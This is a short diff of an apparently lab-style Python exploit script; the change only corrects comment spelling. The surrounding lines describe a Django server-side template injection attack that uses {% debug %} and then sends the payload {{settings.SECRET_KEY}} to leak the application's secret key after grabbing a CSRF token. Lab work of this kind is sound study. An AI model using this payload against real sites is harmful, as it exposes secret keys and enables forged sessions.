@@ -39,8 +39,8 @@ soup = BeautifulSoup(r3.text, 'lxml')
 token = soup.find('input', {'name': 'csrf'})['value'] #template change csrf token
 
 # Template framework is running Django from Python. Steps to find payload
-# 1. Add {% debug %} to template and search enviroment variables
-# 2. discover the 'settings' varable. The documentation reveals the presence of a SECRET.KEY properties: https://docs.djangoproject.com/en/4.2/ref/settings/#std-setting-SECRET_KEY
+# 1. Add {% debug %} to template and search environment variables
+# 2. discover the 'settings' variable. The documentation reveals the presence of a SECRET.KEY properties: https://docs.djangoproject.com/en/4.2/ref/settings/#std-setting-SECRET_KEY
 # 3. Send payload {{settings.SECRET_KEY}} to reveal key
 
 # Post our malicous payload
